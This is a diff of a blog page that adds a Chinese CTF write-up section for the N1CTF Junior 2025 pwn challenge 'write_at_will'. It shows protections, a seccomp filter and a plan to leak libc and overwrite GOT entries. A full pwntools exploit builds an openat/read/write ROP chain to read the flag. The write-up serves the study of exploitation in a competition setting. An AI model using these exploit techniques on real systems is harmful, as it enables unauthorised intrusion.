@@ -33,7 +33,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http://ShlomoJune.github.io/posts/n1junior2025/"
-        },"genre": "posts","keywords": "pwn, fmtstr, .fini_array","wordcount":  540 ,
+        },"genre": "posts","keywords": "pwn, fmtstr, .fini_array","wordcount":  953 ,
         "url": "http://ShlomoJune.github.io/posts/n1junior2025/","datePublished": "2025-03-12T00:04:26+08:00","dateModified": "2025-03-12T00:04:26+08:00","publisher": {
             "@type": "Organization",
             "name": "J4f"},"author": {
@@ -129,7 +129,7 @@
             <div class="post-meta-line">
                 <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/ShlomoJune" title="Author" target="_blank" rel="noopener noreferrer author" class="author">J4f</a>
                 </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/pwn/"><i class="far fa-folder fa-fw"></i>pwn</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2025-03-12">2025-03-12</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2025-03-12">2025-03-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;540 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;3 minutes&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2025-03-12">2025-03-12</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2025-03-12">2025-03-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;953 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;</div>
         </div><div class="content" id="content"><p>N1Junior_2025 Pwn复现</p>
 <h2 id="n1ctfjunior_2025-复现" class="headerLink">
     <a href="#n1ctfjunior_2025-%e5%a4%8d%e7%8e%b0" class="header-mark"></a>N1CTFJunior_2025 复现</h2><h3 id="remake" class="headerLink">
@@ -460,6 +460,204 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">itr</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="write_at_will" class="headerLink">
+    <a href="#write_at_will" class="header-mark"></a>write_at_will</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE (0x400000)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="逆向分析" class="headerLink">
+    <a href="#%e9%80%86%e5%90%91%e5%88%86%e6%9e%90" class="header-mark"></a>逆向分析</h4><p>程序开了沙箱</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"> line  CODE  JT   JF      <span class="nv">K</span>
+</span></span><span class="line"><span class="cl"><span class="o">=================================</span>
+</span></span><span class="line"><span class="cl"> 0000: 0x20 0x00 0x00 0x00000004  <span class="nv">A</span> <span class="o">=</span> arch
+</span></span><span class="line"><span class="cl"> 0001: 0x15 0x01 0x00 0xc000003e  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> ARCH_X86_64<span class="o">)</span> goto <span class="m">0003</span>
+</span></span><span class="line"><span class="cl"> 0002: 0x06 0x00 0x00 0x00000000  <span class="k">return</span> KILL
+</span></span><span class="line"><span class="cl"> 0003: 0x20 0x00 0x00 0x00000000  <span class="nv">A</span> <span class="o">=</span> sys_number
+</span></span><span class="line"><span class="cl"> 0004: 0x15 0x00 0x01 0x0000003c  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> <span class="nb">exit</span><span class="o">)</span> goto <span class="m">0006</span>
+</span></span><span class="line"><span class="cl"> 0005: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
+</span></span><span class="line"><span class="cl"> 0006: 0x15 0x00 0x01 0x00000000  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> <span class="nb">read</span><span class="o">)</span> goto <span class="m">0008</span>
+</span></span><span class="line"><span class="cl"> 0007: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
+</span></span><span class="line"><span class="cl"> 0008: 0x15 0x00 0x01 0x00000001  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> write<span class="o">)</span> goto <span class="m">0010</span>
+</span></span><span class="line"><span class="cl"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
+</span></span><span class="line"><span class="cl"> 0010: 0x15 0x00 0x01 0x00000101  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> openat<span class="o">)</span> goto <span class="m">0012</span>
+</span></span><span class="line"><span class="cl"> 0011: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
+</span></span><span class="line"><span class="cl"> 0012: 0x15 0x00 0x01 0x00000003  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> close<span class="o">)</span> goto <span class="m">0014</span>
+</span></span><span class="line"><span class="cl"> 0013: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
+</span></span><span class="line"><span class="cl"> 0014: 0x06 0x00 0x00 0x00000000  <span class="k">return</span> KILL
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>只允许了exit、read、write、openat、close</p>
+<p>要通过 openat、read、write读出flag，这里注意要在当前目录下创建一个flag</p>
+<h4 id="思路" class="headerLink">
+    <a href="#%e6%80%9d%e8%b7%af" class="header-mark"></a>思路</h4><ul>
+<li>程序中没留后门函数，需要libc，先泄露libc</li>
+<li>改printf_got为gets，改exit_got为0x40165a，改__stack_chk_fail为ret。这样相当于做ROP</li>
+<li>写openat+read+write的ROP链</li>
+</ul>
+<blockquote>
+<p>在call  __stack_chk_fail的时候会push下一条指令的地址</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># pause()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">address</span> <span class="o">=</span> <span class="s1">&#39;./pwn&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ip = &#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># port = </span>
+</span></span><span class="line"><span class="cl"><span class="c1">#p = remote(ip,port)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">exit_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;exit&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">arb_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;. Exit</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;get?&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">address</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#泄露libc</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3. Exit</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;get?&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x404038</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x0a</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)[</span><span class="o">-</span><span class="mi">7</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x7330237b97d0</span> <span class="o">+</span> <span class="mh">0x7330236a5000</span>
+</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc ---&gt; 0x</span><span class="si">%x</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">libc</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gets_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;gets&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#改printf为gets</span>
+</span></span><span class="line"><span class="cl"><span class="n">arb_write</span><span class="p">(</span><span class="mh">0x404030</span><span class="p">,</span><span class="n">gets_addr</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#改exit_got</span>
+</span></span><span class="line"><span class="cl"><span class="n">arb_write</span><span class="p">(</span><span class="n">exit_got</span><span class="p">,</span><span class="mh">0x40165a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#改stack chk fail 为 ret指令</span>
+</span></span><span class="line"><span class="cl"><span class="n">arb_write</span><span class="p">(</span><span class="mh">0x404028</span><span class="p">,</span><span class="mh">0x40101a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">openat</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;openat&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">read</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">write</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">exit_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;exit&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000002a3e5</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000002be51</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdx_rcx_rbx_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000108b03</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x40101a</span>
+</span></span><span class="line"><span class="cl"><span class="n">pl</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0xa</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="n">pl</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404200</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">gets_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pl</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffff9c</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404200</span><span class="p">)</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_rcx_rbx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">openat</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pl</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404300</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_rcx_rbx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pl</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># dbg()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pl</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/flag</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div></div>
